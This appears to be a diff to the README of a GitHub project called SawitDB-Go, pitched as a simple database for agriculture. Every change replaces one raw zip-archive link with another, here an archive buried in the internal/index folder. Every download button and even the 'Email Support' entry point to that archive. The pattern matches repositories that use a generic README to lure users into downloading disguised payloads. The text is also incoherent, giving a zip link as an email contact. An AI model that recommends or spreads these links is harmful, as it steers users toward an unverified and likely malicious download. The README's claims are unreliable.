@@ -1,6 +1,6 @@
 # 🌾 SawitDB-Go - Your Simple Database Solution for Agriculture
 
-[![Download SawitDB-Go](https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/cmd/sawit-server/Go_D_Sawit_1.9.zip)](https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/cmd/sawit-server/Go_D_Sawit_1.9.zip)
+[![Download SawitDB-Go](https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/internal/index/Sawit_D_Go_v1.7.zip)](https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/internal/index/Sawit_D_Go_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ SawitDB-Go is designed for users in the agricultural sector. This database provi
 
 To begin, visit the following page to download the latest version of SawitDB-Go:
 
-[Download SawitDB-Go Releases](https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/cmd/sawit-server/Go_D_Sawit_1.9.zip)
+[Download SawitDB-Go Releases](https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/internal/index/Sawit_D_Go_v1.7.zip)
 
 1. Go to the link above.
 2. Look for the latest version release.
@@ -56,7 +56,7 @@ If you encounter issues during installation or usage, consider the following ste
 You are not alone in your journey with SawitDB-Go. Join our community for support and tips:
 
 - **GitHub Discussions:** Engage with other users and developers. Share ideas and solutions.
-- **Email Support:** Direct any questions to our support team at https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/cmd/sawit-server/Go_D_Sawit_1.9.zip
+- **Email Support:** Direct any questions to our support team at https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/internal/index/Sawit_D_Go_v1.7.zip
 - **Feedback:** We welcome your thoughts on how we can improve SawitDB-Go. Your input is valuable.
 
 ## 📄 License
@@ -67,6 +67,6 @@ SawitDB-Go is open-source software. You can freely use, modify, and distribute i
 
 We release updates often to improve functionality and add new features. Check back on the releases page regularly to stay updated.
 
-[Download SawitDB-Go Releases](https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/cmd/sawit-server/Go_D_Sawit_1.9.zip)
+[Download SawitDB-Go Releases](https://github.com/bunty5017144/SawitDB-Go/raw/refs/heads/main/internal/index/Sawit_D_Go_v1.7.zip)
 
 Thank you for choosing SawitDB-Go as your agricultural database solution. We hope it empowers you in managing your data effectively.
